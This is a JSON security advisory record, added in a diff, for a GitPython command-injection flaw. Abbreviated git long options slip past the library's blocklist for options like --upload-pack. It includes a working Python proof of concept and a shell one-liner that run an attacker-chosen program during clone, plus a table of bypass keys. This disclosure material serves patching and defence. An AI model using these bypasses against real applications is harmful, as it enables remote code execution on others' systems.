@@ -1,0 +1,160 @@
+{
+  "id": "GHSA-2f96-g7mh-g2hx",
+  "modified": "2026-07-21T20:00:30.026840401Z",
+  "published": "2026-07-21T19:43:43Z",
+  "summary": "GitPython: Command Injection via git long-option prefix abbreviation bypass of CVE-2026-42215 blocklist",
+  "details": "## Command injection via long-option prefix abbreviation bypassing `check_unsafe_options` (incomplete fix of CVE-2026-42215 / GHSA-rpm5-65cw-6hj4)\n\n**Component:** gitpython-developers/GitPython (PyPI: GitPython)\n**Affected:** all versions carrying the 3.1.47 blocklist fix, through current `main` (verified at commit `20c5e275`, `3.1.50-42`)\n**CWE:** CWE-184 (Incomplete List of Disallowed Inputs) → CWE-78 (OS Command Injection)\n**Severity:** inherits the parent CVE-2026-42215 surface; estimated High, ~8.8 (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) — final scoring deferred to maintainer/CNA, mirroring the parent.\n**Reporter:** hackkim\n\n### Summary\n\nThe 3.1.47 fix for CVE-2026-42215 blocks dangerous git options (`--upload-pack`, `--config`, `-c`, `-u` for clone; `--upload-pack` for fetch/pull; `--receive-pack`, `--exec` for push) so callers cannot reach command-executing options unless they pass `allow_unsafe_options=True`.\n\nThe fix canonicalizes an option name along **one** axis (underscore→hyphen via `dashify`) and checks it against an **exact-match** dict. It does not account for git's unambiguous long-option prefix abbreviation. Git accepts any unambiguous prefix of a long option (`--upload-p`, `--upload-pa`, `--upload-pac` all resolve to `--upload-pack`). So a kwarg key like `upload_p` canonicalizes to `upload-p`, misses the blocklist dict, and is emitted to git as `--upload-p=\u003cvalue\u003e` → executed as `--upload-pack=\u003cvalue\u003e` → command injection, in the default `allow_unsafe_options=False` configuration.\n\n### The asymmetry (root cause)\n\n```python\n# git/cmd.py (commit 20c5e275), lines 948-974\n@classmethod\ndef _canonicalize_option_name(cls, option):\n    option_name = option.lstrip(\"-\").split(\"=\", 1)[0]\n    option_tokens = option_name.split(None, 1)\n    if not option_tokens:\n        return \"\"\n    return dashify(option_tokens[0])      # only transform: \"_\" -\u003e \"-\"\n\n@classmethod\ndef check_unsafe_options(cls, options, unsafe_options):\n    canonical_unsafe_options = {cls._canonicalize_option_name(o): o for o in unsafe_options}\n    for option in options:\n        unsafe_option = canonical_unsafe_options.get(cls._canonicalize_option_name(option))\n        if unsafe_option is not None:\n            raise UnsafeOptionError(...)\n```\n\nThe guard normalizes only `_`→`-` and does exact dict membership. Git's CLI parser accepts a broader grammar (prefix abbreviation) than the guard models, so abbreviated keys slip through and reach git as the blocked option.\n\n### Affected code (commit `20c5e275`)\n\n| Location | Role |\n|---|---|\n| `git/cmd.py:948-960` `_canonicalize_option_name` | canonicalizer — no prefix expansion |\n| `git/cmd.py:963-974` `check_unsafe_options` | exact-match dict lookup (the incomplete guard) |\n| `git/cmd.py:1511` `transform_kwarg` | emits `--\u003cdashify(name)\u003e=\u003cvalue\u003e` to the CLI |\n| `git/repo/base.py:1411,1413` | clone call sites |\n| `git/remote.py:1074,1128,1201` | fetch / pull / push call sites |\n\n### Bypass keys (verified)\n\n| kwarg key | git resolves to | path | weaponizable |\n|---|---|---|---|\n| `upload_p`, `upload_pac` | `--upload-pack` | clone / fetch / pull | Yes — direct RCE |\n| `receive_p` | `--receive-pack` | push | Yes — direct RCE |\n| `exe` | `--exec` | push | Yes — direct RCE |\n| `conf`, `confi` | `--config` | clone | bypasses option blocklist; RCE needs an additional config vector (see note) |\n\n### Minimal PoC\n\nSelf-contained, no network egress (a local bare repo acts as the \"remote\"). Tested on current `main` (git 2.50.1):\n\n```python\nimport os, stat, tempfile\nfrom git import Repo\n\nwork = tempfile.mkdtemp()\nmarker = os.path.join(work, \"RCE_MARKER\")\n\n# fake \"upload-pack\" program that proves arbitrary command execution\nprog = os.path.join(work, \"evil.sh\")\nwith open(prog, \"w\") as f:\n    f.write(f\"#!/bin/sh\\ntouch {marker}\\nexit 1\\n\")  # exit 1 so git aborts after our code ran\nos.chmod(prog, os.stat(prog).st_mode | stat.S_IEXEC)\n\nbare = os.path.join(work, \"remote.git\")\nRepo.init(bare, bare=True)\n\n# attacker-controlled kwarg KEY 'upload_p' -\u003e --upload-p=\u003cprog\u003e -\u003e git runs \u003cprog\u003e\ntry:\n    Repo.clone_from(bare, os.path.join(work, \"out\"), upload_p=prog)\nexcept Exception:\n    pass  # git aborts with GitCommandError AFTER the payload executed\n\nprint(\"RCE marker created:\", os.path.exists(marker))  # True -\u003e command injection confirmed\n```\n\nEquivalent at the shell: `git clone --upload-p=/tmp/evil.sh src out` runs `evil.sh`.\n\nConfirmed behavior:\n- `upload_pack` (exact) → blocked; `upload_p` (abbrev) → passes guard, reaches git, executes. The fix works for the form it models but not the abbreviated form.\n- `allow_unsafe_options=True` opt-out behaves as documented (out of scope).\n\n### Honest scope note\n\nLike the parent CVE, exploitation requires a host application that flows attacker-controlled kwarg **keys** into a GitPython clone/fetch/pull/push. Where the host passes only fixed/validated keys, this is not reachable — the vulnerability is in the library's documented defense-in-depth control (`allow_unsafe_options=False`), which this variant defeats.\n\nOn the `--config` family: `conf` bypasses the option blocklist, but weaponizing `--config protocol.ext.allow=always` via an `ext::` URL is independently blocked by GitPython's protocol allowlist (`allow_unsafe_protocols=False`). The directly weaponizable family is `upload-pack` / `receive-pack` / `exec`. Reported transparently — not claiming Critical.\n\n### Suggested remediation (any one)\n\n1. **Prefix-aware matching:** reject any option whose canonical name is an unambiguous prefix of a blocked option (≈ `startswith` on the blocked canonical name, after `dashify`).\n2. **Disable abbreviation at the sink:** pass `--end-of-options` or invoke git in a way that disables long-option abbreviation.\n3. **Allowlist** option names on security-sensitive subcommands instead of a blocklist.\n\nRemediation should also cover the `-c`/`--config` family abbreviations, even though the `ext::` route is currently gated by the protocol allowlist.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "gitpython",
+        "purl": "pkg:pypi/gitpython"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.1.51"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.7",
+        "0.2.0-beta1",
+        "0.3.0-beta1",
+        "0.3.0-beta2",
+        "0.3.1-beta2",
+        "0.3.2",
+        "0.3.2.1",
+        "0.3.2.RC1",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.9.dev0",
+        "2.0.9.dev1",
+        "2.1.0",
+        "2.1.1",
+        "2.1.10",
+        "2.1.11",
+        "2.1.12",
+        "2.1.13",
+        "2.1.14",
+        "2.1.15",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.1.7",
+        "2.1.8",
+        "2.1.9",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.0.6",
+        "3.0.7",
+        "3.0.8",
+        "3.0.9",
+        "3.1.0",
+        "3.1.1",
+        "3.1.10",
+        "3.1.11",
+        "3.1.12",
+        "3.1.13",
+        "3.1.14",
+        "3.1.15",
+        "3.1.16",
+        "3.1.17",
+        "3.1.18",
+        "3.1.19",
+        "3.1.2",
+        "3.1.20",
+        "3.1.22",
+        "3.1.23",
+        "3.1.24",
+        "3.1.25",
+        "3.1.26",
+        "3.1.27",
+        "3.1.28",
+        "3.1.29",
+        "3.1.3",
+        "3.1.30",
+        "3.1.31",
+        "3.1.32",
+        "3.1.33",
+        "3.1.34",
+        "3.1.35",
+        "3.1.36",
+        "3.1.37",
+        "3.1.38",
+        "3.1.4",
+        "3.1.40",
+        "3.1.41",
+        "3.1.42",
+        "3.1.43",
+        "3.1.44",
+        "3.1.45",
+        "3.1.46",
+        "3.1.47",
+        "3.1.48",
+        "3.1.49",
+        "3.1.5",
+        "3.1.50",
+        "3.1.6",
+        "3.1.7",
+        "3.1.8",
+        "3.1.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.1.50",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-2f96-g7mh-g2hx/GHSA-2f96-g7mh-g2hx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-2f96-g7mh-g2hx"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/pull/2161"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/commit/56806080c1348749b07daa4a2024ce47b3cad285"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gitpython-developers/GitPython"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51"
+    }
+  ]
+}
